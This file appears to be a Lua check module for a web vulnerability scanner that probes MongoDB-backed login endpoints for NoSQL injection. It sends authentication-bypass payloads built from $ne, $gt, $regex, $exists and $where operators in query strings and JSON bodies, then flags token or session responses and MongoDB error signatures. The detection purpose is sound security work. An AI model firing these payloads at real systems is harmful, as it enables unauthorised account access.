-- nosql_injection.lua
-- Detects NoSQL injection vulnerabilities (MongoDB, CouchDB)
-- Common in Node.js/Express + MongoDB applications
--
-- Tests:
--   1. MongoDB operator injection via query params ($gt, $ne, $regex)
--   2. JSON body NoSQL injection
--   3. Authentication bypass via operator injection
--   4. Error-based detection (MongoDB error signatures)

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- MongoDB error signatures in response body
local mongo_errors = {
    "MongoError",
    "E11000 duplicate key",
    "BSONObj size",
    "mongo.driver.MongoServerError",
    "Cannot apply $gt",
    "Command failed with error",
    "OperationFailure",
    "not authorized on",
    'CastError',
    "ObjectId",
    "bson_type",
}

-- Query parameter NoSQL injection payloads
local query_payloads = {
    -- Operator injection (auth bypass)
    {"username[$ne]", "invalid", "password[$ne]", "invalid"},
    {"username[$gt]", "", "password[$gt]", ""},
    {"username[$regex]", ".*", "password[$regex]", ".*"},
    {"username[$exists]", "true", "password[$exists]", "true"},
}

-- Test common login/auth endpoints with query param injection
local auth_paths = {"/login", "/api/login", "/api/auth", "/api/users/login", "/auth", "/signin"}
for _, path in ipairs(auth_paths) do
    local url = base_url .. path

    -- First check if endpoint exists
    local check = http.get(url)
    if not check or check.status >= 500 or check.status == 404 then
        goto continue_path
    end

    for _, payload_set in ipairs(query_payloads) do
        -- Build query string with operator injection
        local qs = ""
        for i = 1, #payload_set, 2 do
            if qs ~= "" then qs = qs .. "&" end
            qs = qs .. payload_set[i] .. "=" .. payload_set[i+1]
        end

        local test_url = url .. "?" .. qs
        local resp = http.get(test_url)
        if resp then
            -- Check for auth bypass (200/302 with token/session in response)
            if resp.status == 200 or resp.status == 302 then
                local body_lower = (resp.body or ""):lower()
                if body_lower:find("token") or body_lower:find("session") or
                   body_lower:find("authenticated") or body_lower:find("welcome") then
                    report.finding("critical", "sqli", "NoSQL Injection Authentication Bypass",
                        "MongoDB operator injection bypassed authentication. " ..
                        "Payload: " .. qs, test_url)
                    return
                end
            end
        end
    end

    ::continue_path::
end

-- JSON body NoSQL injection payloads
local json_payloads = {
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
    '{"$where": "sleep(100)"}',  -- short sleep to avoid DoS
    '{"username": {"$where": "this.password.length > 0"}}',
}

for _, path in ipairs(auth_paths) do
    local url = base_url .. path
    for _, json_body in ipairs(json_payloads) do
        local resp = http.post_json(url, json_body)
        if resp then
            -- Check for auth bypass
            if resp.status == 200 then
                local body_lower = (resp.body or ""):lower()
                if body_lower:find("token") or body_lower:find("session") or
                   body_lower:find("success") then
                    report.finding("critical", "sqli", "NoSQL Injection (JSON Body) Auth Bypass",
                        "MongoDB NoSQL injection via JSON body bypassed authentication. " ..
                        "Endpoint: " .. url .. ", Payload: " .. json_body, url)
                    return
                end
            end

            -- Check for MongoDB error signatures
            for _, sig in ipairs(mongo_errors) do
                if resp.body and resp.body:find(sig, 1, true) then
                    report.finding("high", "sqli", "NoSQL Injection Error Detected",
                        "MongoDB error signature '" .. sig .. "' found when injecting NoSQL operators. " ..
                        "Endpoint: " .. url, url)
                    return
                end
            end
        end
    end
end

-- Error-based detection: inject invalid BSON/operators into existing endpoints
local resp = http.get(TARGET)
if resp and resp.body then
    -- Try injecting NoSQL operators into discovered query parameters
    local test_params = {"id", "user", "username", "email", "search", "query", "name"}
    for _, param in ipairs(test_params) do
        local test_url = TARGET .. (TARGET:find("?") and "&" or "?") .. param .. "[$gt]="
        local r = http.get(test_url)
        if r and r.body then
            for _, sig in ipairs(mongo_errors) do
                if r.body:find(sig, 1, true) then
                    report.finding("high", "sqli",
                        "NoSQL Injection via Parameter '" .. param .. "'",
                        "MongoDB error '" .. sig .. "' triggered by operator injection on param '" ..
                        param .. "'", test_url)
                    return
                end
            end
        end
    end
end
